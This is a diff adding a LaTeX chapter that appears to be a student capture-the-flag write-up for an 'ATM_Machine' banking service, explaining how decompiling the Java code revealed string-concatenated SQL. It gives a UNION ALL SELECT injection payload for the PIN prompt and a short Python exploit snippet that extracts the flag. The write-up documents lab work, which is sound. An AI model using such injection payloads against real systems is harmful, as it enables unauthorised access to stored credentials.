@@ -1,0 +1,50 @@
+\chapter{ATM\_Machine}
+
+The ATM\_Machine Service is a bank automate service in which the user has three options. It is possible to create an account with a ping, to check the balance of an account and to withdraw money from an account. If the user tries to withdraw more money than he has, the service will close the connection. 
+
+At First the ATM.jar File was Decompiled using the JAD-Decompiler. After that a simple string concatenation was found which leadd to the possibility of a SQL-Injection. After that the structure of the Database was analized and with the SQLite editor test injection were tried. 
+
+After some testing the solution was to connect to the service, than choose option 1 to check the account Balance. After that the service ask for an account number here the user can type in any char. Now the service needs the pin and here we can use the SQL injection.
+The statment we need ist UNION ALL SELECT acnum, cash, password FROM login WHERE acnum = ''"' + self.flagID. Now the service returns the password for the falgID which is the flag itself.
+
+For the statement we need the UNION ALL SELECT to unite the existing statment result with the injected one. We only need the password from the database but because the service only returns the thid collumn we need two previous ones. Thats why acnum, cash, password was used with password in the third collumn. "'FROM login WHERE acnum = ''"' + self.flagID"' was used to read the password from the correct table using the given account number which was the flagID given from the provider.
+
+
+
+%ATM Machine Writeup
+%=====================
+%(Simon Varga, Markus Monz)
+%
+%1. Decompile Java service [ATM.class] using JAD-Decompiler
+%2. See simple string concatenation instead of prepared statement [line 29]
+%3. Watch SQLite database structure [see <pathToService>/rw/database.db]
+%4. Use SQLite editor to execute test injection statements [solution see exploit]
+%
+%
+%Description of Exploit
+%=====================
+%1. $> Connect to service with nc on port 20051
+%2. Service asks to choose banking operation
+%3. $> Choose option "1" [Check account balance]
+%4. Service asks for account number
+%5. $> Give any character
+%6. Service asks for pin [here comes the magic, inject SQL statement]
+%7. $> "1' UNION ALL SELECT acnum, cash, password FROM login WHERE acnum = '" + self.flagID
+%8. Service returns the password, which is the flag, related to the given account number
+%
+%Exploit Components
+%=====================
+%    "1'" - close the existing statement
+%    "UNION ALL SELECT" - unite the existing statement result with the injected one
+%    "acnum, cash, password" - put password in the third column, because the service only returns the third column
+%    "FROM login WHERE acnum = '" + self.flagID" - read the password from the correct table using the given account number
+%
+%Exploit [python]
+%=====================
+%    s.send('1\n')
+%    s.send('blub\n')
+%    s.send("1' UNION ALL SELECT acnum, cash, password FROM login WHERE acnum = '" + self.flagID)
+%    flag = s.recv(512)
+%    p = re.compile('Your Balance is: (FLG.{13})')
+%    m = p.match(flag)
+%    flag = m.group(1)
